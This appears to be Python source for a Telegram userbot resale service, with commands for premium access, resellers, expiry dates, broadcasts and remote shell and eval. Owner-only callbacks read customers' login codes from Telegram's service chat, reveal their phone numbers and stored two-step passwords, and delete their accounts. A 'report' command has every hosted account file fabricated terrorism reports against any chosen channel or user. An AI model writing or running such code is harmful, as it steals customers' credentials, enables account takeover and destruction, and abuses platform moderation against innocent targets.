import asyncio
import traceback
from datetime import datetime, timedelta

from pyrogram import raw
from pyrogram.errors import (ChannelInvalid, FloodWait, InputUserDeactivated,
                             PeerIdInvalid, UserIsBlocked, UsernameNotOccupied)
from pyrogram.helpers import kb
from pytz import timezone

from assistant.create_users import setExpiredUser
from assistant.eval import cb_evalusi, cb_gitpull2, cb_shell
from config import AKSES_DEPLOY, BOT_ID, LOG_SELLER, SUDO_OWNERS
from Haji import bot, haji
from Haji.database import dB
from Haji.helpers import CMD, ButtonUtils, Emoji, Message
from Haji.logger import logger


@CMD.BOT("addprem")
async def _(client, message):
    return await add_prem_user(client, message)


@CMD.UBOT("addprem")
async def _(client, message):
    user_id = message.from_user.id
    seles = await dB.get_list_from_var(BOT_ID, "SELLER")
    if user_id not in seles:
        return
    return await add_prem_user(client, message)


async def add_prem_user(client, message):
    user_id, get_bulan = await client.extract_user_and_reason(message)
    if not user_id:
        return await message.reply(
            f"<b>{message.text.split()[0]} [user_id/username - bulan]</b>"
        )
    try:
        get_id = (await client.get_users(user_id)).id
    except Exception as error:
        return await message.reply(str(error))
    if not get_bulan:
        get_bulan = 1
    premium = AKSES_DEPLOY
    if get_id in premium:
        return await message.reply(
            f"Pengguna denga ID : `{get_id}` sudah memiliki akses !"
        )
    AKSES_DEPLOY.append(get_id)
    if not await dB.get_expired_date(get_id):
        await setExpiredUser(get_id)
    await message.reply(
        f"✅  <b>Akses diberikan kepada {get_id}!! Silahkan pergi ke @{bot.me.username}"
    )
    target1 = f"<a href=tg://user?id={message.from_user.id}>{message.from_user.first_name} {message.from_user.last_name or ''}</a>"
    try:
        target = await bot.get_users(user_id)
        target2 = f"<a href=tg://user?id={target.id}>{target.first_name} {target.last_name or ''}</a>"
    except Exception:
        target2 = get_id
    await bot.send_message(
        LOG_SELLER, f"<b>User: {target1} gives access to: {target2}</b>"
    )
    try:
        return await bot.send_message(
            get_id,
            f"Selamat ! Akun anda sudah memiliki akses untuk pembuatan Userbot",
            reply_markup=kb(
                [["✅ Lanjutkan Buat Userbot"]],
                resize_keyboard=True,
                one_time_keyboard=True,
            ),
        )
    except Exception:
        pass


@CMD.BOT("unprem")
async def _(client, message):
    return await un_prem_user(client, message)


@CMD.UBOT("unprem")
async def _(client, message):
    user_id = message.from_user.id
    seles = await dB.get_list_from_var(BOT_ID, "SELLER")
    if user_id not in seles:
        return
    return await un_prem_user(client, message)


async def un_prem_user(client, message):
    user_id = await client.extract_user(message)
    if not user_id:
        return await message.reply("Balas pesan pengguna atau berikan user_id/username")
    try:
        user = await client.get_users(user_id)
    except Exception as error:
        await message.reply(str(error))
    delpremium = AKSES_DEPLOY
    if user.id not in delpremium:
        return await message.reply("Tidak ditemukan")
    AKSES_DEPLOY.remove(user.id)
    return await message.reply(f" ✅ {user.mention} berhasil dihapus")


@CMD.BOT("listprem")
async def get_prem_user(client, message):
    text = ""
    count = 0
    for user_id in AKSES_DEPLOY:
        try:
            user = await client.get_users(user_id)
            count += 1
            userlist = f"• {count}: <a href=tg://user?id={user.id}>{user.first_name} {user.last_name or ''}</a> > <code>{user.id}</code>"
        except Exception:
            continue
        text += f"{userlist}\n"
    if not text:
        return await message.reply_text("Tidak ada pengguna yang ditemukan")
    else:
        return await message.reply_text(text)


@CMD.BOT("addseller")
@CMD.FAKE_NLX
async def _(client, message):
    return await add_seller(client, message)


@CMD.UBOT("addseller")
@CMD.FAKE_NLX
async def _(client, message):
    return await add_seller(client, message)


async def add_seller(client, message):
    user = None
    user_id = await client.extract_user(message)
    if not user_id:
        return await message.reply("Balas pesan pengguna atau berikan user_id/username")
    try:
        user = await client.get_users(user_id)
    except Exception as error:
        await message.reply(str(error))
    seles = await dB.get_list_from_var(BOT_ID, "SELLER")
    if user.id in seles:
        return await message.reply("Sudah menjadi reseller.")

    await dB.add_to_var(BOT_ID, "SELLER", user.id)
    return await message.reply(f"✅ {user.mention} telah menjadi reseller")


@CMD.BOT("unseller")
@CMD.FAKE_NLX
async def _(client, message):
    return await un_seller(client, message)


@CMD.UBOT("unseller")
@CMD.FAKE_NLX
async def _(client, message):
    return await un_seller(client, message)


async def un_seller(client, message):
    user = None
    user_id = await client.extract_user(message)
    if not user_id:
        return await message.reply("Balas pesan pengguna atau berikan user_id/username")
    try:
        user = await client.get_users(user_id)
    except Exception as error:
        await message.reply(str(error))
    seles = await dB.get_list_from_var(BOT_ID, "SELLER")
    if user.id not in seles:
        return await message.reply("Tidak ditemukan")
    await dB.remove_from_var(BOT_ID, "SELLER", user.id)
    return await message.reply(f"{user.mention} berhasil dihapus")


@CMD.BOT("listseller")
@CMD.FAKE_NLX
async def get_seles_user(client, message):
    text = ""
    count = 0
    seles = await dB.get_list_from_var(BOT_ID, "SELLER")
    for user_id in seles:
        try:
            user = await client.get_users(user_id)
            count += 1
            userlist = f"• {count}: <a href=tg://user?id={user.id}>{user.first_name} {user.last_name or ''}</a> > <code>{user.id}</code>"
        except Exception:
            continue
        text += f"{userlist}\n"
    if not text:
        return await message.reply_text("Tidak ada pengguna yang ditemukan")
    else:
        return await message.reply_text(text)


@CMD.BOT("addexpired")
async def _(client, message):
    user_id, get_day = await client.extract_user_and_reason(message)
    if not user_id:
        return await message.reply(f"{message.text.split()[0]} user_id/username - hari")
    try:
        get_id = (await client.get_users(user_id)).id
    except Exception as error:
        return await message.reply(str(error))
    if not get_day:
        get_day = 30
    now = datetime.now(timezone("Asia/Jakarta"))
    expire_date = now + timedelta(days=int(get_day))
    await dB.set_expired_date(user_id, expire_date)
    return await message.reply(f"{get_id} telah diaktifkan selama {get_day} hari.")


@CMD.BOT("cek|cekexpired")
async def _(client, message):
    user_id = await client.extract_user(message)
    if not user_id:
        return await message.reply("Pengguna tidak ditemukan")
    expired_date = await dB.get_expired_date(user_id)
    if not expired_date:
        return await message.reply(f"{user_id} belum diaktifkan.")
    expir = expired_date.astimezone(timezone("Asia/Jakarta")).strftime("%Y-%m-%d %H:%M")
    return await message.reply(f"{user_id} aktif hingga {expir}.")


@CMD.BOT("unexpired")
async def _(client, message):
    user = None
    user_id = await client.extract_user(message)
    if not user_id:
        return await message.reply("User tidak ditemukan")
    try:
        user = await client.get_users(user_id)
    except Exception as error:
        return await message.reply(str(error))
    await dB.rem_expired_date(user.id)
    return await message.reply(f"✅ {user.id} expired telah dihapus")


@CMD.BOT("broadcast")
@CMD.FAKE_NLX
async def _(client, message):
    users = await dB.get_list_from_var(client.me.id, "BROADCAST")
    if not message.reply_to_message:
        return await message.reply("<b>Silahkan balas ke pesan!</b>")
    reply = message.reply_to_message
    gagal = 0
    sukses = 0
    for i in users:
        try:
            await reply.copy(i)
            sukses += 1
        except FloodWait as e:
            await asyncio.sleep(e.value)
            await reply.copy(i)
            sukses += 1
        except UserIsBlocked:
            await dB.remove_from_var(BOT_ID, "BROADCAST", i)
            gagal += 1
            continue
        except PeerIdInvalid:
            await dB.remove_from_var(BOT_ID, "BROADCAST", i)
            gagal += 1
            continue
        except InputUserDeactivated:
            await dB.remove_from_var(BOT_ID, "BROADCAST", i)
            gagal += 1
            continue
    return await message.reply(
        f"<b>Berhasil mengirim pesan ke `{sukses}` pengguna, gagal ke `{gagal}` pengguna, dari `{len(users)}` pengguna.</b>",
    )


@CMD.UBOT("shell|sh")
@CMD.FAKE_NLX
async def _(client: haji, message):
    return await cb_shell(client, message)


@CMD.UBOT("eval|ev|e")
@CMD.NLX
@CMD.DEV_CMD("ceval")
async def _(client: haji, message):
    return await cb_evalusi(client, message)


@CMD.UBOT("reboot|update")
@CMD.FAKE_NLX
async def _(client: haji, message):
    return await cb_gitpull2(client, message)


@CMD.CALLBACK("^(prev_ub|next_ub)")
async def _(client, callback_query):
    await callback_query.answer()
    query = callback_query.data.split()
    count = int(query[1])
    if query[0] == "next_ub":
        if count == len(haji._ubot) - 1:
            count = 0
        else:
            count += 1
    elif query[0] == "prev_ub":
        if count == 0:
            count = len(haji._ubot) - 1
        else:
            count -= 1
    try:
        return await callback_query.edit_message_text(
            await Message.userbot(count),
            reply_markup=(ButtonUtils.userbot(haji._ubot[count].me.id, count)),
        )
    except Exception as e:
        return f"Error: {e}"


@CMD.CALLBACK("^(get_otp|get_phone|get_faktor|ub_deak|deak_akun)")
async def _(client, callback_query):
    await callback_query.answer()
    user_id = callback_query.from_user.id
    query = callback_query.data.split()
    if user_id not in SUDO_OWNERS:
        return await callback_query.answer(
            f"<b>GAUSAH REWEL YA ANJING! {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    X = haji._ubot[int(query[1])]
    if query[0] == "get_otp":
        async for otp in X.search_messages(777000, limit=1):
            try:
                if not otp.text:
                    await callback_query.answer("❌ Kode tidak ditemukan", True)
                else:
                    await callback_query.edit_message_text(
                        otp.text,
                        reply_markup=(ButtonUtils.userbot(X.me.id, int(query[1]))),
                    )
                    return await X.delete_messages(X.me.id, otp.id)
            except Exception as error:
                return await callback_query.answer(error, True)
    elif query[0] == "get_phone":
        try:
            return await callback_query.edit_message_text(
                f"<b>📲 Nomer telepon <code>{X.me.id}</code> adalah <code>{X.me.phone_number}</code></b>",
                reply_markup=(ButtonUtils.userbot(X.me.id, int(query[1]))),
            )
        except Exception as error:
            return await callback_query.answer(error, True)
    elif query[0] == "get_faktor":
        code = await dB.get_var(X.me.id, "PASSWORD")
        if code == None:
            return await callback_query.answer(
                "🔐 Kode verifikasi 2 langkah tidak ditemukan", True
            )
        else:
            return await callback_query.edit_message_text(
                f"<b>🔐 Kode verifikasi 2 langkah pengguna <code>{X.me.id}</code> adalah : <code>{code}</code></b>",
                reply_markup=(ButtonUtils.userbot(X.me.id, int(query[1]))),
            )
    elif query[0] == "ub_deak":
        return await callback_query.edit_message_reply_markup(
            reply_markup=(ButtonUtils.deak(X.me.id, int(query[1])))
        )
    elif query[0] == "deak_akun":
        haji._ubot.remove(X)
        await X.invoke(raw.functions.account.DeleteAccount(reason="madarchod hu me"))
        return await callback_query.edit_message_text(
            Message.deak(X),
            reply_markup=(ButtonUtils.userbot(X.me.id, int(query[1]))),
        )


@CMD.UBOT("getubot")
@CMD.FAKE_NLX
async def _(client, message):
    em = Emoji(client)
    await em.get()
    query = "get_users"
    try:
        inline = await ButtonUtils.send_inline_bot_result(
            message, message.chat.id, bot.me.username, query
        )
        if inline:
            return await message.delete()
    except Exception:
        logger.error(f"{traceback.format_exc()}")
        return await message.reply(f"{em.gagal}Error: {traceback.format_exc()}")


@CMD.CALLBACK("^del_ubot")
async def _(client, callback_query):
    await callback_query.answer()
    user_id = callback_query.from_user.id
    if user_id not in SUDO_OWNERS:
        return await callback_query.answer(
            f"<b>GAUSAH DIPENCET YA ANJING! {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    await callback_query.answer()
    try:
        show = await bot.get_users(callback_query.data.split()[1])
        get_id = show.id
        get_mention = f"<a href=tg://user?id={get_id}>{show.first_name} {show.last_name or ''}</a>"
    except Exception:
        get_id = int(callback_query.data.split()[1])
        get_mention = f"<a href=tg://user?id={get_id}>Userbot</a>"
    for X in haji._ubot:
        if get_id == X.me.id:
            await X.unblock_user(bot.me.username)
            await dB.remove_ubot(X.me.id)
            await dB.rem_expired_date(X.me.id)
            haji._get_my_id.remove(X.me.id)
            haji._ubot.remove(X)
            await bot.send_message(
                LOG_SELLER,
                f"<b> ✅ {get_mention} Deleted on database</b>",
            )
            return await bot.send_message(
                X.me.id,
                f"<b>💬 Masa Aktif Anda Telah Habis</b>\n<b>Ads: {await Message._ads()}</b>",
            )


@CMD.BOT("report")
@CMD.NLX
async def mass_report(client, message):
    if len(message.command) < 2:
        await message.reply(
            "Please provide a channel username.\nUsage: `massreport [user|channel] username`"
        )
        return
    command, uname = client.extract_type_and_msg(message)
    if command == "channel":
        report_text = (
            "This channel spreads fake news, misleads people, thereby inciting aggression "
            "and calling for war between nations. It contains posts with violent threats to the life "
            "and health of Ukrainian citizens. Under international law, this is regarded as terrorism. "
            "Therefore we ask You to block it as soon as possible!"
        )
        status_msg = await message.reply(f"⏳ Reporting @{uname}...")
        try:
            for user in haji._ubot:
                try:
                    peer = await user.resolve_peer(f"@{uname}")
                except UsernameNotOccupied:
                    await message.reply(f"❌ Username @{uname} does not exist.")
                    return
                except ChannelInvalid:
                    await message.reply(
                        f"❌ Channel @{uname} is invalid or not accessible."
                    )
                    return
                except PeerIdInvalid:
                    await message.reply(f"❌ Cannot find entity @{uname}.")
                    return
                await user.invoke(
                    raw.functions.account.ReportPeer(
                        peer=peer,
                        reason=raw.types.InputReportReasonOther(),
                        message=report_text,
                    )
                )

            return await status_msg.edit(f"✅ @{uname} has been reported successfully.")

        except Exception as e:
            import traceback

            error_traceback = traceback.format_exc()
            return await status_msg.reply(
                f"❌ Error occurred while reporting:\n`{error_traceback}`"
            )
    elif command == "user":
        try:
            status_msg = await message.reply(
                f"⏳ Processing report for user @{uname}..."
            )
            report_text = (
                "This user spreads fake news, misleads people, thereby inciting aggression "
                "and calling for war between nations. The account contains violent threats "
                "and promotes harmful content. Under platform guidelines, this account "
                "should be suspended. Please review and take appropriate action."
            )
            for user in haji._ubot:
                try:
                    peer = await user.resolve_peer(f"@{uname}")
                except UsernameNotOccupied:
                    await status_msg.edit(f"❌ Username @{uname} does not exist.")
                    return
                except PeerIdInvalid:
                    await status_msg.edit(f"❌ Cannot find user @{uname}.")
                    return
                await user.invoke(
                    raw.functions.account.ReportPeer(
                        peer=peer,
                        reason=raw.types.InputReportReasonOther(),
                        message=report_text,
                    )
                )
            return await status_msg.edit(
                f"✅ User @{uname} has been reported successfully."
            )

        except Exception as e:
            import traceback

            error_traceback = traceback.format_exc()
            return await status_msg.edit(
                f"❌ Error occurred while reporting user:\n`{error_traceback}`"
            )
